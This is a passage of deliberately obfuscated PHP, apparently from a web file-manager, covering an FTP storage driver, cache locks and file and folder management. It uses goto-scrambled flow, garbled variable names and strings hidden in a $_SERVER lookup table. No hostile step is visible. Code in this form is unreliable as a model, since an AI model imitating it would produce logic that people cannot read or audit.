(!$this->_isconn()) { return !1; } $fó˜ÜŠèª = $this->pathThis($this->iconvSystem($BĞò÷àñ)); $fóŠÅ¼Ô°ó = $this->tempFile($fó˜ÜŠèª); goto fÈéä¢ÎÄ¨; fÈéä¢ÎÄ¨: file_put_contents($fóŠÅ¼Ô°ó, $e½è™†×); $EÕÎ¼Ï›õ = $this->upload($BĞò÷àñ, $this->iconvApp($fóŠÅ¼Ô°ó)); $this->tempFileRemve($fóŠÅ¼Ô°ó); goto Cğ†ƒ…ë»ß; Cğ†ƒ…ë»ß: return $EÕÎ¼Ï›õ; goto D…„±¨œµá; D…„±¨œµá: } public function fileSubstr($CÖë¸åœÏ, $B£Ğ¨§Œëí = 0, $c×÷×¹ØŞÄ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($CÖë¸åœÏ, $B£Ğ¨§Œëí, $c×÷×¹ØŞÄ); } private function ftpRequest($cÔŞÛÂÚĞå, $dï°åíŸÙ› = 0, $A¾ÅÄŞµ© = false) { goto A¸¦Üƒ î¾; E™‹ºš°¿½: curl_setopt($A¶Ø·“¯Ÿ², CURLOPT_RETURNTRANSFER, 1); $D¬ä•¹”ì = curl_exec($A¶Ø·“¯Ÿ²); curl_close($A¶Ø·“¯Ÿ²); goto DÎöŠêëôÚ; A¸¦Üƒ î¾: $cÔŞÛÂÚĞå = $this->iconvSystem($cÔŞÛÂÚĞå); $E¦™Ò°ÃÑ‹ = $this->scheme . $this->host . $_SERVER[…Ò×–][4] . $this->port; $A¶Ø·“¯Ÿ² = curl_init(); goto bÓ³Ïïëâä; bÓ³Ïïëâä: curl_setopt($A¶Ø·“¯Ÿ², CURLOPT_URL, $E¦™Ò°ÃÑ‹ . $this->pathEncode($cÔŞÛÂÚĞå)); curl_setopt($A¶Ø·“¯Ÿ², CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($A¾ÅÄŞµ©) { $fæ¸§¸Ì…ì = $dï°åíŸÙ› + $A¾ÅÄŞµ© - 1; curl_setopt($A¶Ø·“¯Ÿ², CURLOPT_RANGE, "{$dï°åíŸÙ›}\x2d{$fæ¸§¸Ì…ì}"); } goto E™‹ºš°¿½; DÎöŠêëôÚ: return $D¬ä•¹”ì; goto eœŠ„İ÷‚; eœŠ„İ÷‚: } public function upload($BàöÖ›•ò, $fÅ¡¶Ô¡–Œ, $cßÄÃÙòğ = false, $A„¬›¹Ë¾Ñ = REPEAT_REPLACE) { goto A·«ñäÇè; A·«ñäÇè: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($BàöÖ›•ò))) { return !1; } $BàöÖ›•ò = $this->iconvSystem($BàöÖ›•ò); goto c‘‹½øÚØ; A¡É¿òÈ—æ: if ($dİèéİ’’Å != FTP_FINISHED) { return !1; } return $this->getPathOuter($BàöÖ›•ò); goto F®‘ŒèÅ´…; c‘‹½øÚØ: $fÅ¡¶Ô¡–Œ = $this->iconvSystem($fÅ¡¶Ô¡–Œ); $dİèéİ’’Å = ftp_nb_put($this->connect, $BàöÖ›•ò, $fÅ¡¶Ô¡–Œ, FTP_BINARY); while ($dİèéİ’’Å == FTP_MOREDATA) { $dİèéİ’’Å = ftp_nb_continue($this->connect); } goto A¡É¿òÈ—æ; F®‘ŒèÅ´…: } public function download($fÖ¶Ä½ÅÈ…, $dÀ¾•é¾Û = '') { goto Dˆî–ê¥Œ‚; eñÜ‘È£œ·: while ($EÄê„êº == FTP_MOREDATA) { $EÄê„êº = ftp_nb_continue($this->connect); } if ($EÄê„êº != FTP_FINISHED) { return !1; } return $this->iconvApp($dÀ¾•é¾Û); goto BŠ‹›Ÿ³; Dˆî–ê¥Œ‚: if (!$this->_isconn()) { return !1; } $f¹ »¢åö = $this->pathFather($dÀ¾•é¾Û); if (!IO::mkdir($f¹ »¢åö)) { return !1; } goto f”Ù•àáéŞ; f”Ù•àáéŞ: $fÖ¶Ä½ÅÈ… = $this->iconvSystem($fÖ¶Ä½ÅÈ…); $dÀ¾•é¾Û = $this->iconvSystem($dÀ¾•é¾Û); $EÄê„êº = ftp_nb_get($this->connect, $dÀ¾•é¾Û, $fÖ¶Ä½ÅÈ…, FTP_BINARY); goto eñÜ‘È£œ·; BŠ‹›Ÿ³: } private function ftpList($F·ô‹³œÅã) { goto c¯ÚõÒ„‚; c¯ÚõÒ„‚: $e¹È¬ À‹ =& $_SERVER[…Ò×–]; if (!$this->isFolder($F·ô‹³œÅã)) { return !1; } @ftp_chdir($this->connect, $e¹È¬ À‹[8]); goto BÂñ©Ğ´ç; D½œ¬Ğ¼Û: return $A‹‰ğçö‡Ğ; goto dÚøª¥¢ÔÃ; BÂñ©Ğ´ç: $F·ô‹³œÅã = rtrim($F·ô‹³œÅã, $e¹È¬ À‹[8]) . $e¹È¬ À‹[8]; $dË­†İˆ°¡ = @ftp_nlist($this->connect, $F·ô‹³œÅã); if ($dË­†İˆ°¡ === !1) { $dË­†İˆ°¡ = @ftp_rawlist($this->connect, $F·ô‹³œÅã); foreach ($dË­†İˆ°¡ as $b¾º™‹ØÒ¼ => $b¯Ïƒ™¾‘’) { $dË­†İˆ°¡[$b¾º™‹ØÒ¼] = end(explode($e¹È¬ À‹[1177], $b¯Ïƒ™¾‘’)); } } goto AºÂ§Ì®÷£; AºÂ§Ì®÷£: $dË­†İˆ°¡ = array_diff($dË­†İˆ°¡, array($e¹È¬ À‹[91], $e¹È¬ À‹[1178], $F·ô‹³œÅã . $e¹È¬ À‹[91], $F·ô‹³œÅã . $e¹È¬ À‹[1178])); $A‹‰ğçö‡Ğ = array(); foreach ($dË­†İˆ°¡ as $E²˜öœ–ë¥) { if (!strstr($E²˜öœ–ë¥, $e¹È¬ À‹[8])) { $E²˜öœ–ë¥ = $F·ô‹³œÅã . ltrim($E²˜öœ–ë¥, $e¹È¬ À‹[8]); } $A‹‰ğçö‡Ğ[] = $this->iconvApp($E²˜öœ–ë¥); } goto D½œ¬Ğ¼Û; dÚøª¥¢ÔÃ: } private function recursionFtpFiles($e³õÕèÃÄö, &$E¼Ò˜´âøŒ) { $cŞËŸ—¦Ä =& $_SERVER[…Ò×–]; if (!$this->_isconn()) { return !1; } if (!($eºÆæÛÓ›Ò = $this->ftpList($e³õÕèÃÄö))) { return !1; } foreach ($eºÆæÛÓ›Ò as $e³õÕèÃÄö) { if ($this->isFolder($e³õÕèÃÄö)) { $this->recursionFtpFiles($e³õÕèÃÄö, $E¼Ò˜´âøŒ); $E¼Ò˜´âøŒ[$cŞËŸ—¦Ä[74]][] = $e³õÕèÃÄö; } else { $E¼Ò˜´âøŒ[$cŞËŸ—¦Ä[73]][] = $e³õÕèÃÄö; } } } private function objectMeta($CÄÑ’ÅàŠˆ) { goto a¹Â¡¹…Ğ”; AËÏ›³“™§: $D×‰Ô„Û›£ = @ftp_size($this->connect, $this->iconvSystem($CÄÑ’ÅàŠˆ)); if ($D×‰Ô„Û›£ != -1) { $BÊ¾«Ÿ¸ã¬ = array($bğŸò’‹Æß[77] => $D×‰Ô„Û›£, $bğŸò’‹Æß[29] => $bğŸò’‹Æß[171]); } else { $dŸª£“Ëñ = @ftp_chdir($this->connect, $this->iconvSystem($CÄÑ’ÅàŠˆ)); $BÊ¾«Ÿ¸ã¬ = $dŸª£“Ëñ ? array($bğŸò’‹Æß[77] => 0, $bğŸò’‹Æß[29] => $bğŸò’‹Æß[76]) : !1; } Cache::set($c¤‰óÓÖˆ†, $BÊ¾«Ÿ¸ã¬, 0); goto cê»ó©±; a¹Â¡¹…Ğ”: $bğŸò’‹Æß =& $_SERVER[…Ò×–]; $c¤‰óÓÖˆ† = $bğŸò’‹Æß[1179] . md5($CÄÑ’ÅàŠˆ); $BÊ¾«Ÿ¸ã¬ = Cache::get($c¤‰óÓÖˆ†); goto cÄ‰²Ò™¶; cÄ‰²Ò™¶: if ($BÊ¾«Ÿ¸ã¬ !== null && $BÊ¾«Ÿ¸ã¬ !== !1) { return $BÊ¾«Ÿ¸ã¬; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $bğŸò’‹Æß[8]); goto AËÏ›³“™§; cê»ó©±: return $BÊ¾«Ÿ¸ã¬; goto D™äèÜ²²•; D™äèÜ²²•: } } goto CëÈáÇîÆ´; eí‚•ğ«Î‚: class CacheLockMemcached { public function lock($bÛê±…´š, $AÇå®Å°·Æ = 0) { $D´†½¹“³° = Cache::init(); $d­Ãñ”ğÑ = microtime(!0) + $AÇå®Å°·Æ; while (microtime(!0) < $d­Ãñ”ğÑ) { $Eİ´ù…›»× = $D´†½¹“³°->get($bÛê±…´š); if (!$Eİ´ù…›»× || $Eİ´ù…›»× < microtime(!0)) { $e½•õÊÂÉÛ = $D´†½¹“³°->handle->add($bÛê±…´š, $d­Ãñ”ğÑ, $AÇå®Å°·Æ); if ($e½•õÊÂÉÛ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($aÎƒ´ùÉĞÅ) { return Cache::init()->get($aÎƒ´ùÉĞÅ); } public function unlock($bÌÙãß…°) { return Cache::init()->remove($bÌÙãß…°); } } class CacheLockDatabase { public function lock($Cø™½Ò‹¨î, $eªÁğ¿ê˜Ù = 0) { $B¾ÅÛğâ„ = Model($_SERVER[…Ò×–][761]); $dÚ¢£œ®½Ô = microtime(!0) + $eªÁğ¿ê˜Ù; while (microtime(!0) < $dÚ¢£œ®½Ô) { $fíÃù’ª‰Ê = $B¾ÅÛğâ„->get($Cø™½Ò‹¨î); if (!$fíÃù’ª‰Ê || $fíÃù’ª‰Ê < microtime(!0)) { $a©×íŸ¶ÎÙ = $B¾ÅÛğâ„->set($Cø™½Ò‹¨î, $dÚ¢£œ®½Ô); if ($a©×íŸ¶ÎÙ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($a‚ù²¤é²Á) { return Model($_SERVER[…Ò×–][761])->get($a‚ù²¤é²Á); } public function unlock($a“ˆÜ·é‚Ú) { Model($_SERVER[…Ò×–][761])->remove($a“ˆÜ·é‚Ú); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($aª©ßîÇ¶â, $EÓ©óÙÒ­¿) { $F®¤Şáá¶“ =& $_SERVER[…Ò×–]; if (!class_exists($F®¤Şáá¶“[785])) { show_json($F®¤Şáá¶“[786], !1); } $this->cacheTime = $EÓ©óÙÒ­¿; $this->handle = new Memcached(); if (is_array($aª©ßîÇ¶â[$F®¤Şáá¶“[787]]) && count($aª©ßîÇ¶â[$F®¤Şáá¶“[787]]) >= 1) { foreach ($aª©ßîÇ¶â[$F®¤Şáá¶“[787]] as $FšÒ™Íğñ) { $Eº–ÏÙ®¤ = explode($F®¤Şáá¶“[4], $FšÒ™Íğñ); $this->handle->addServer($Eº–ÏÙ®¤[0], $Eº–ÏÙ®¤[1]); } } else { $this->handle->addServer($aª©ßîÇ¶â[$F®¤Şáá¶“[173]], $aª©ßîÇ¶â[$F®¤Şáá¶“[174]]); } } public function set($D†³âÍœ, $CÕâœâŠØ, $E“¾Â”Åµ = false) { $E“¾Â”Åµ = $E“¾Â”Åµ ? $E“¾Â”Åµ : $this->cacheTime; return $this->handle->set($D†³âÍœ, $CÕâœâŠØ, $E“¾Â”Åµ); } public function get($a¥¹Â´ƒø¬) { return $this->handle->get($a¥¹Â´ƒø¬); } public function remove($fÌŞùøó) { return $this->handle->delete($fÌŞùøó); } public function deleteAll() { return $this->handle->flush(); } } goto BáÜÂ£×á; a°ôÄÑÊá«: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($cïÁ†î±íŠ) { $cÙŸ±ºÜ“Ü =& $_SERVER[…Ò×–]; $Fİ¹¥ÍÑ = Model($cÙŸ±ºÜ“Ü[479])->where(array($cÙŸ±ºÜ“Ü[1441] => $cïÁ†î±íŠ))->find(); $fĞƒáé¯Ñ¤ = $this->_mkdirRoot(SourceModel::TYPE_USER, $cïÁ†î±íŠ, $Fİ¹¥ÍÑ[$cÙŸ±ºÜ“Ü[28]]); $this->userDesktopAdd($fĞƒáé¯Ñ¤); return $fĞƒáé¯Ñ¤; } public function userDesktopAdd($Eã©´°Œ¥Ö) { $e”’Æµ¨Û =& $_SERVER[…Ò×–]; $EøŞ”Äğƒ˜ = LNG($e”’Æµ¨Û[2372]); $fˆ²Á‹ğÊî = $this->mkdir($Eã©´°Œ¥Ö, $EøŞ”Äğƒ˜); $this->metaSet($fˆ²Á‹ğÊî, $e”’Æµ¨Û[2373], $e”’Æµ¨Û[83]); $this->metaSet($Eã©´°Œ¥Ö, $e”’Æµ¨Û[2374], $fˆ²Á‹ğÊî); } public function groupRootAdd($EÓÎ’ğïˆ) { $CäĞà¥ğ”œ =& $_SERVER[…Ò×–]; $bÕÏÛêË•Õ = Model($CäĞà¥ğ”œ[463])->where(array($CäĞà¥ğ”œ[2196] => $EÓÎ’ğïˆ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $EÓÎ’ğïˆ, $bÕÏÛêË•Õ[$CäĞà¥ğ”œ[28]]); } public function systemRootPathAdd($f¶šÔËìÅ®) { if ($f¶šÔËìÅ® != $_SERVER[…Ò×–][1099]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $f¶šÔËìÅ®); } public function userRootRemove($dÌ…£á…õ) { $EÆÓ£Š°‹ = $this->sourceRoot(SourceModel::TYPE_USER, $dÌ…£á…õ); if (!$EÆÓ£Š°‹) { return; } $this->remove($EÆÓ£Š°‹, !1); } public function groupRootRemove($AçÇ‹°¼¥È) { $C‘îÃäËó = $this->sourceRoot(SourceModel::TYPE_GROUP, $AçÇ‹°¼¥È); if (!$C‘îÃäËó) { return; } $this->remove($C‘îÃäËó, !1); } private function _mkdirRoot($CÉ¨©°¤, $B‚—î®…ËÁ, $a±´–¬‚°ä) { goto a«…ÖªĞŒ®; D°ñöè±‡µ: $DÀ»®ŒÙƒğ = "\115\157\144\145\154\123\x6f\165\x72\x63\145\56\155\153\x64\x69\x72\122\157\x6f\x74\x2e{$CÉ¨©°¤}\56{$B‚—î®…ËÁ}\56" . $a±´–¬‚°ä; CacheLock::lock($DÀ»®ŒÙƒğ); $d¼î‡ ¾óÌ[$c‰×ÄÇŠ±§[28]] = $a±´–¬‚°ä; goto C¢„Ù‹ìõ; F÷Ã§Œğ±: CacheLock::unlock($DÀ»®ŒÙƒğ); return $dç¯”¯®˜ò; goto A¹Ìºáˆº; a«…ÖªĞŒ®: $c‰×ÄÇŠ±§ =& $_SERVER[…Ò×–]; $d¼î‡ ¾óÌ = array($c‰×ÄÇŠ±§[372] => 0, $c‰×ÄÇŠ±§[526] => $CÉ¨©°¤, $c‰×ÄÇŠ±§[527] => $B‚—î®…ËÁ, $c‰×ÄÇŠ±§[523] => 1, $c‰×ÄÇŠ±§[528] => USER_ID, $c‰×ÄÇŠ±§[529] => USER_ID, $c‰×ÄÇŠ±§[524] => $c‰×ÄÇŠ±§[33], $c‰×ÄÇŠ±§[530] => $c‰×ÄÇŠ±§[475], $c‰×ÄÇŠ±§[400] => 0, $c‰×ÄÇŠ±§[525] => 0, $c‰×ÄÇŠ±§[424] => 0, $c‰×ÄÇŠ±§[531] => $c‰×ÄÇŠ±§[33]); if ($cÛÄ¼™»Ê = $this->where($d¼î‡ ¾óÌ)->find()) { return $cÛÄ¼™»Ê[$c‰×ÄÇŠ±§[373]]; } goto D°ñöè±‡µ; C¢„Ù‹ìõ: $dç¯”¯®˜ò = $this->add($d¼î‡ ¾óÌ); $e›ŸÔŠİ´à = array($c‰×ÄÇŠ±§[532] => short_id($dç¯”¯®˜ò)); $this->where(array($c‰×ÄÇŠ±§[387] => $dç¯”¯®˜ò))->save($e›ŸÔŠİ´à); goto F÷Ã§Œğ±; A¹Ìºáˆº: } private function sourceRoot($bŠÖ™É„ˆ„, $EÎ†²½Õõ¤, $AØ•ìîŞ™ = false) { $cù„ªŞ¨‘Á =& $_SERVER[…Ò×–]; $b¦¤´­ê„¾ = array($cù„ªŞ¨‘Á[372] => 0, $cù„ªŞ¨‘Á[526] => $bŠÖ™É„ˆ„, $cù„ªŞ¨‘Á[527] => $EÎ†²½Õõ¤); if ($bËÍ¤ªåŸö = $this->where($b¦¤´­ê„¾)->find()) { return $AØ•ìîŞ™ ? $bËÍ¤ªåŸö : $bËÍ¤ªåŸö[$cù„ªŞ¨‘Á[373]]; } return !1; } public function sourceRootGroup($CÏ¿âÁæ’æ) { $dºÍ¦òˆ¨Á =& $_SERVER[…Ò×–]; if (is_string($CÏ¿âÁæ’æ)) { $CÏ¿âÁæ’æ = array($CÏ¿âÁæ’æ); } $bÌÉÕÅÄÜ = array($dºÍ¦òˆ¨Á[372] => 0, $dºÍ¦òˆ¨Á[526] => SourceModel::TYPE_GROUP, $dºÍ¦òˆ¨Á[527] => array($dºÍ¦òˆ¨Á[7], $CÏ¿âÁæ’æ)); $fó¯Éïâ©Õ = $this->listSource($bÌÉÕÅÄÜ, 1000); return array_to_keyvalue($fó¯Éïâ©Õ[$dºÍ¦òˆ¨Á[74]], $dºÍ¦òˆ¨Á[461]); } public function mkfile($Aô«ŒÚø—„, $cÈ¸ø‚¦µ’, $a­ÙÁ—Û°ë = '', $få­Ó›‹£² = REPEAT_RENAME) { $b‚©‚ÅÄ =& $_SERVER[…Ò×–]; $bÑ˜ÏŒïĞ = Model($b‚©‚ÅÄ[548])->addFileByContent($a­ÙÁ—Û°ë, $cÈ¸ø‚¦µ’); return $this->_createFileCall($Aô«ŒÚø—„, $cÈ¸ø‚¦µ’, $bÑ˜ÏŒïĞ, $få­Ó›‹£², $b‚©‚ÅÄ[1139]); } public function addFile($c‚ÜÙ‰“¦Ä, $F¥Ë¶ÒîÔê, $dÙÕ½î‡œ, $Cğ«…ê¯² = false, $AÅİ‘ƒÇÁ = REPEAT_RENAME) { $E•Û¢Ãò = Model($_SERVER[…Ò×–][548])->addFile($F¥Ë¶ÒîÔê, $dÙÕ½î‡œ, $Cğ«…ê¯²); return $this->_createFileCall($c‚ÜÙ‰“¦Ä, $dÙÕ½î‡œ, $E•Û¢Ãò, $AÅİ‘ƒÇÁ); } public function addFileByFileID($A™ïâ…Ò, $A£—Ø·¢ô†, $böß’Óˆ—Ô, $A±¡’é‹åö = REPEAT_RENAME) { $AÂÛ—§­Î =& $_SERVER[…Ò×–]; $AÎˆÜ£¸ Ã = Model($AÂÛ—§­Î[548])->find($A£—Ø·¢ô†); Model($AÂÛ—§­Î[548])->linkAdd($A£—Ø·¢ô†); return $this->_createFileCall($A™ïâ…Ò, $böß’Óˆ—Ô, $AÎˆÜ£¸ Ã, $A±¡’é‹åö); } public function addFileByRemote($C¢¬ùÂÌË, $E§ÁÕ‰òä, $eöÈ™­ê¥», $a­åãÂ•Óæ = array(), $Eö›îÀß = REPEAT_RENAME) { $cßİ‹ôóãò = Model($_SERVER[…Ò×–][548])->addFileByRemote($E§ÁÕ‰òä, $eöÈ™­ê¥», $a­åãÂ•Óæ); return $this->_createFileCall($C¢¬ùÂÌË, $eöÈ™­ê¥», $cßİ‹ôóãò, $Eö›îÀß); } private function _createFileCall($b¦ŠŸ ¹‚Ò, $d•¿Ô¯Î°, $cáŠ‹‡«÷¯, $f÷ñÂƒŸŒ‡, $F¹ïÔèë÷‰ = "\165\160\x6c\x6f\141\x64") { goto CŞ¯„ñ‚Á; cî´¦Ù³Î: $c®ŠÈÜœÈ» = $this->_createFile($b¦ŠŸ ¹‚Ò, $d•¿Ô¯Î°, $cáŠ‹‡«÷¯, $f÷ñÂƒŸŒ‡, $c¼Ò‚¥¨»Û); if (!$c¼Ò‚¥¨»Û) { Model($aáµÍ—¬½[426])->remove($cáŠ‹‡«÷¯[$aáµÍ—¬½[423]]); } else { if ($c®ŠÈÜœÈ») { Model($aáµÍ—¬½[2344])->eventCreate($c®ŠÈÜœÈ», $F¹ïÔèë÷‰); } } $this->lockWriteEnd($b¦ŠŸ ¹‚Ò, $d•¿Ô¯Î°); goto A¬¶…™æÙ‚; A¬¶…™æÙ‚: return $c®ŠÈÜœÈ»; goto e¢ùä–ëÙÄ; CŞ¯„ñ‚Á: $aáµÍ—¬½ =& $_SERVER[…Ò×–]; $c¼Ò‚¥¨»Û = !1; $this->lockWriteStart($b¦ŠŸ ¹‚Ò, $d•¿Ô¯Î°); goto cî´¦Ù³Î; e¢ùä–ëÙÄ: } public function mkdir($aÚÂƒšØ×Æ, $DõäŸ’ÅµÇ, $A©ÒëÛÌí› = REPEAT_SKIP) { goto bˆ‰á¾êâù; CÏÇÛÑ×¦: return $aĞ³ËµíŠ¨; goto dİ”á†õÉë; FçßÎÑˆÇ´: $this->lockWriteStart($aÚÂƒšØ×Æ, $DõäŸ’ÅµÇ); if ($A©ÒëÛÌí› !== !1) { $aôÔº«¬Ïç = $this->fileNameExist($aÚÂƒšØ×Æ, $DõäŸ’ÅµÇ); if ($aôÔº«¬Ïç && $A©ÒëÛÌí› != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($aÚÂƒšØ×Æ, $DõäŸ’ÅµÇ); return $aôÔº«¬Ïç; } $DõäŸ’ÅµÇ = $this->fileNameAuto($aÚÂƒšØ×Æ, $DõäŸ’ÅµÇ, $A©ÒëÛÌí›); } $FÉ–ƒâ‹ÅŠ = array($C·¸Şš—½ë[523] => 1, $C·¸Şš—½ë[390] => $DõäŸ’ÅµÇ, $C·¸Şš—½ë[524] => $C·¸Şš—½ë[33], $C·¸Şš—½ë[424] => 0, $C·¸Şš—½ë[525] => 0); goto a¶ÑòÆ†»Ç; a¶ÑòÆ†»Ç: $aĞ³ËµíŠ¨ = $this->_addSoure($FÉ–ƒâ‹ÅŠ, $B±âŠ¶ÄºŞ); Model($C·¸Şš—½ë[2344])->eventCreate($aĞ³ËµíŠ¨, $C·¸Şš—½ë[1140]); $this->lockWriteEnd($aÚÂƒšØ×Æ, $DõäŸ’ÅµÇ); goto CÏÇÛÑ×¦; bˆ‰á¾êâù: $C·¸Şš—½ë =& $_SERVER[…Ò×–]; $B±âŠ¶ÄºŞ = $this->sourceInfo($aÚÂƒšØ×Æ); if (!$B±âŠ¶ÄºŞ) { return !1; } goto FçßÎÑˆÇ´; dİ”á†õÉë: } private function _createFile($eé™ùİ½¸, $C£”«õäŸœ, $CÕÍµ¤¼µ, $E˜•Æ˜Îî«, &$CŒå¦é¤‹) { goto f¸¥Ö¸«¢; dì½²§ì·: if ($E˜•Æ˜Îî« !== !1) { $bÆ‹…÷â­• = $this->fileNameExist($eé™ùİ½¸, $C£”«õäŸœ); } $CŒå¦é¤‹ = !0; if ($E˜•Æ˜Îî« && $bÆ‹…÷â­•) { if ($E˜•Æ˜Îî« == REPEAT_SKIP) { $CŒå¦é¤‹ = !1; return $bÆ‹…÷â­•; } else { if ($E˜•Æ˜Îî« == REPEAT_REPLACE) { $BÎé©¸öÏ = $this->sourceInfo($bÆ‹…÷â­•); $E¸ÃÔ«‘“ = $this->fileHistory($BÎé©¸öÏ, $CÕÍµ¤¼µ[$E†¦²å–†‚[423]], $CÕÍµ¤¼µ[$E†¦²å–†‚[77]]); if (!$E¸ÃÔ«‘“) { $CŒå¦é¤‹ = !1; } else { $this->folderSizeReset($eé™ùİ½¸); } return $bÆ‹…÷â­•; } else { $C£”«õäŸœ = $this->fileNameAuto($eé™ùİ½¸, $C£”«õäŸœ, $E˜•Æ˜Îî«, !1); } } } goto dŠÒÅšªÂØ; dŠÒÅšªÂØ: $CØÉ­‹”Ş = array($E†¦²å–†‚[523] => 0, $E†¦²å–†‚[390] => $C£”«õäŸœ, $E†¦²å–†‚[524] => get_path_ext($C£”«õäŸœ), $E†¦²å–†‚[424] => $CÕÍµ¤¼µ[$E†¦²å–†‚[423]], $E†¦²å–†‚[525] => $CÕÍµ¤¼µ[$E†¦²å–†‚[77]]); $c¶æ„æóß = $this->_addSoure($CØÉ­‹”Ş, $f—¨Ò©±Ä±); $this->folderSizeReset($eé™ùİ½¸); goto F¯Û¡°’Ñ; f¸¥Ö¸«¢: $E†¦²å–†‚ =& $_SERVER[…Ò×–]; $f—¨Ò©±Ä± = $this->sourceInfo($eé™ùİ½¸); if (!$CÕÍµ¤¼µ || !$f—¨Ò©±Ä±) { return !1; } goto dì½²§ì·; F¯Û¡°’Ñ: return $c¶æ„æóß; goto CĞèêê¨ø¿; CĞèêê¨ø¿: } protected function fileHistory($e„¨Ğæ˜î, $d‘Ä«™¿éÀ, $eìœ‚øóö) { goto bîÛñÑ–Ü; c±Š™»¿ˆ¯: Model($D×Áó”¶öß[2375])->addHistory($e„¨Ğæ˜î); $EËŸÃÂ‚Å• = array($D×Áó”¶öß[529] => USER_ID, $D×Áó”¶öß[394] => time(), $D×Áó”¶öß[423] => $d‘Ä«™¿éÀ, $D×Áó”¶öß[77] => $eìœ‚øóö); $this->where(array($D×Áó”¶öß[387] => $e„¨Ğæ˜î[$D×Áó”¶öß[373]]))->save($EËŸÃÂ‚Å•); goto d¨…¿²óéñ; bîÛñÑ–Ü: $D×Áó”¶öß =& $_SERVER[…Ò×–]; if ($e„¨Ğæ˜î[$D×Áó”¶öß[423]] == $d‘Ä«™¿éÀ) { return !1; } $this->checkLock($e„¨Ğæ˜î[$D×Áó”¶öß[373]], $d‘Ä«™¿éÀ); goto c±Š™»¿ˆ¯; d¨…¿²óéñ: return !0; goto C¹õœ´Üõ; C¹õœ´Üõ: } public function checkLock($c´ƒº¤Œ, $c…‡„Ç„¡ë) { goto f£°« ¿; f£°« ¿: $CÃ‹–íÊšŠ =& $_SERVER[…Ò×–]; $BŞ× ˆÈ¬ = $this->pathInfo($c´ƒº¤Œ); if (!$this->fileIsLock($BŞ× ˆÈ¬, !0)) { return; } goto c…Û¤Õóåè; bÆÁ‰Üîé‡: $this->_createFileCall($BŞ× ˆÈ¬[$CÃ‹–íÊšŠ[466]], $Fï¢¸ —Á, $A–ÒÕ¾•’Í, REPEAT_REPLACE, $CÃ‹–íÊšŠ[1139]); $AÁ˜“â‹×Ç = $BŞ× ˆÈ¬[$CÃ‹–íÊšŠ[421]][$CÃ‹–íÊšŠ[486]]; $fÄ»í‹èª¹ = $AÁ˜“â‹×Ç[$CÃ‹–íÊšŠ[2377]] ? $AÁ˜“â‹×Ç[$CÃ‹–íÊšŠ[2377]] : $AÁ˜“â‹×Ç[$CÃ‹–íÊšŠ[28]]; goto B¿®éÅ›ç; B¿®éÅ›ç: show_json(LNG($CÃ‹–íÊšŠ[2378]) . $CÃ‹–íÊšŠ[2379] . LNG($CÃ‹–íÊšŠ[2380]) . $CÃ‹–íÊšŠ[2381] . $fÄ»í‹èª¹ . $CÃ‹–íÊšŠ[2382], !1); goto EÏ‘Ûé—¬; c…Û¤Õóåè: $EŒ¥²¹Ø = Session::get($CÃ‹–íÊšŠ[2376]); $Fï¢¸ —Á = substr($BŞ× ˆÈ¬[$CÃ‹–íÊšŠ[28]], 0, -1 - strlen($BŞ× ˆÈ¬[$CÃ‹–íÊšŠ[165]])) . $CÃ‹–íÊšŠ[1402] . $EŒ¥²¹Ø . $CÃ‹–íÊšŠ[91] . $BŞ× ˆÈ¬[$CÃ‹–íÊšŠ[165]]; $A–ÒÕ¾•’Í = Model($CÃ‹–íÊšŠ[548])->find($c…‡„Ç„¡ë); goto bÆÁ‰Üîé‡; EÏ‘Ûé—¬: } public function fileIsLock($DªÄŸ‡£·©, $E›ŸÛŒ‚³Ç = false) { goto F¼¢«Œ¹µ÷; A¥àÈªã†: return !1; goto C‹œè¤…ŒÇ; eÍ¹ªô¹Õç: $bŸø‘Ä™©æ = $GLOBALS[$d¦¡ï×Œ³[6]][$d¦¡ï×Œ³[84]][$d¦¡ï×Œ³[484]]; if ($DªÄŸ‡£·©[$d¦¡ï×Œ³[421]][$d¦¡ï×Œ³[485]] <= time() - $bŸø‘Ä™©æ) { $this->metaSet($DªÄŸ‡£·©[$d¦¡ï×Œ³[373]], $d¦¡ï×Œ³[483], null); $this->metaSet($DªÄŸ‡£·©[$d¦¡ï×Œ³[373]], $d¦¡ï×Œ³[485], null); } if ($E›ŸÛŒ‚³Ç) { $this->metaSet($DªÄŸ‡£·©[$d¦¡ï×Œ³[373]], $d¦¡ï×Œ³[485], time()); } goto A¥àÈªã†; F¼¢«Œ¹µ÷: $d¦¡ï×Œ³ =& $_SERVER[…Ò×–]; if (!isset($DªÄŸ‡£·©[$d¦¡ï×Œ³[421]]) || !$DªÄŸ‡£·©[$d¦¡ï×Œ³[421]][$d¦¡ï×Œ³[483]]) { return !1; } if ($DªÄŸ‡£·©[$d¦¡ï×Œ³[421]][$d¦¡ï×Œ³[483]] != USER_ID) { return !0; } goto eÍ¹ªô¹Õç; C‹œè¤…ŒÇ: } private function _addSoure($a¡«¶ÌÛØÕ, $BñÅì‹×¸è) { goto CÑ¶Öæ§; b©„•’Î½ƒ: return $f¨±Ä÷ğè; goto F·¹‡ËšÌ¦; b†ƒ¿¢•­ğ: $this->updateModifyTime($a¡«¶ÌÛØÕ[$e¨ŞÁê¨[466]]); $cí„¢ğï¿ = $e¨ŞÁê¨[2383] . $BñÅì‹×¸è[$e¨ŞÁê¨[373]]; if (isset(self::$cacheChildList[$cí„¢ğï¿])) { unset(self::$cacheChildList[$cí„¢ğï¿]); } goto EÙÔ¨¹ù¥ô; CÑ¶Öæ§: $e¨ŞÁê¨ =& $_SERVER[…Ò×–]; $A‚ÊæÇÚ = array($e¨ŞÁê¨[526] => $BñÅì‹×¸è[$e¨ŞÁê¨[375]], $e¨ŞÁê¨[527] => $BñÅì‹×¸è[$e¨ŞÁê¨[461]], $e¨ŞÁê¨[528] => USER_ID, $e¨ŞÁê¨[529] => USER_ID, $e¨ŞÁê¨[372] => $BñÅì‹×¸è[$e¨ŞÁê¨[373]], $e¨ŞÁê¨[530] => $BñÅì‹×¸è[$e¨ŞÁê¨[464]] . 